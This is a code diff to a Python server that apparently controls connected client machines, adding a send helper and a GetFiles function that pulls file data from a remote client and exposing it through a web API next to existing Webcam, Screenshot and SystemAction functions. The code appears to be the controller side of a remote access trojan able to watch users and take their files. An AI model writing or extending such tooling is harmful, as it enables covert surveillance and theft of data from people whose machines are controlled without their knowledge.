@@ -22,6 +22,26 @@ def get_client(connection):
    for client in clients:
       if (client['connection_id'] == connection):
          return client
+      
+def send(connection, data):
+   try:
+      client = None
+
+      for c in clients:
+         if (c['connection_id'] == connection):
+            client = c['socket']
+            break
+
+      if (client is None):
+         raise socket.error
+         
+      if (isinstance(data, bytes)):
+         client.send(data)
+      else:
+         client.send(data.encode())
+         
+   except (IndexError, AttributeError, socket.error):
+      return str()
 
 def receive(connection, decode=True, buffer=1024):
    try:
@@ -197,6 +217,26 @@ def Webcam(connection):
       return base64.b64encode(data)
    
    return None
+
+def GetFiles(connection, path):
+   response = send_and_receive(connection, 'files')
+
+   if ('files' in response):
+      send(connection, path)
+      folderExists = receive(connection)
+
+      if ('error' in folderExists):
+         return 'notexist'
+      
+      send(connection, 'ok')
+      fileSize = int(receive(connection))
+
+      send(connection, 'ok')
+      data = str(receive_all(connection, False, fileSize), 'utf-8')
+      
+      return data
+   
+   return None
    
 def SystemAction(connection, action):
    response = send_and_receive(connection, action)
@@ -278,10 +318,11 @@ webapi.api.isConnected = isConnected
 webapi.api.ManageConnections = ManageConnections
 webapi.api.ControlClient = ControlClient
 webapi.api.ClientInformation = ClientInformation
+webapi.api.SystemAction = SystemAction
 webapi.api.SendMessage = SendMessage
 webapi.api.Screenshot = Screenshot
 webapi.api.Webcam = Webcam
-webapi.api.SystemAction = SystemAction
+webapi.api.GetFiles = GetFiles
 
 server_thread = threading.Thread(target=start_websocket_server)
 server_thread.daemon = True
